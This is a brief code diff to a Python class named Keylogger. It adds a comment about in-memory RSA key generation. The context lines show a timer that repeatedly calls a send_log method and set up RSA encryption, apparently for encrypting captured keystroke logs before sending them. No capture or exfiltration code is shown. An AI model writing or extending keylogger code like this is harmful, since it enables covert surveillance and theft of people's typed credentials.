@@ -116,11 +116,13 @@ class Keylogger:
         timer = threading.Timer(interval=self.interval, function=self.send_log)
         timer.start()
 
+    # Creates an RSA key pair for asymetric encryption, keys are stored in memory
     def generate_keys(self):
         new_key = RSA.generate(2048)
         self.private_key = new_key.exportKey()
         self.public_key = new_key.publickey().exportKey()
 
+    
     def get_rsa_cipher(self, key):
         rsakey = RSA.importKey(key)
         return (PKCS1_OAEP.new(rsakey), rsakey.size_in_bytes())
